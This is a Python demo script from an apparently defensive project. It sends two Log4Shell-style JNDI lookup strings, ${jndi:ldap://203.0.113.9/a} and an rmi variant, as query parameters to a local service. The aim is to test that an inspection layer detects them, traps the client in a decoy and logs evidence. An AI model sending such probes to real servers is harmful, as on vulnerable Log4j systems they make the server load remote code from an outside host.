"""Demo: a Log4Shell-style request, to trip ring 6 (inspection) and reach Hedwig as evidence.

Solves the ring 3 challenge like a determined bot, then sends a JNDI lookup string
(`${jndi:ldap://...}`) in a query parameter — the classic Log4Shell probe — against a service
that is open to it. Ring 6 catches it (the pattern is a copy of Hedwig's own evidence regex),
traps the client in the decoy, and appends the hit to the service's access log, so
`hedwig scan` sees evidence level 3 for that service.

Everything here is a detection string; nothing it sends does anything but match a regex.

    uv run --project guard python guard/tools/attacks/payload.py [--ip 127.0.0.8]
"""

import argparse

from common import with_session

PAYLOADS = [
    ("jndi lookup against transaction", "/transaction/?ref=${jndi:ldap://203.0.113.9/a}"),
    ("jndi lookup against support", "/support/tickets?q=${jndi:rmi://203.0.113.9/a}"),
]


def run(ip: str = "127.0.0.8") -> None:
    """Sends each JNDI probe. A 200 does not mean it got through: once ring 6 traps a client,
    the decoy answers and looks just like the real service, so check the dashboard."""
    c = with_session(ip)
    try:
        for label, path in PAYLOADS:
            reply = c.get(path)
            print(f"{label:<34} {reply.status_code}")
    finally:
        c.close()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--ip", default="127.0.0.8")
    args = parser.parse_args()
    run(args.ip)
    print(f"watch {args.ip} on the dashboard, and the service's Hedwig evidence level")


if __name__ == "__main__":
    main()
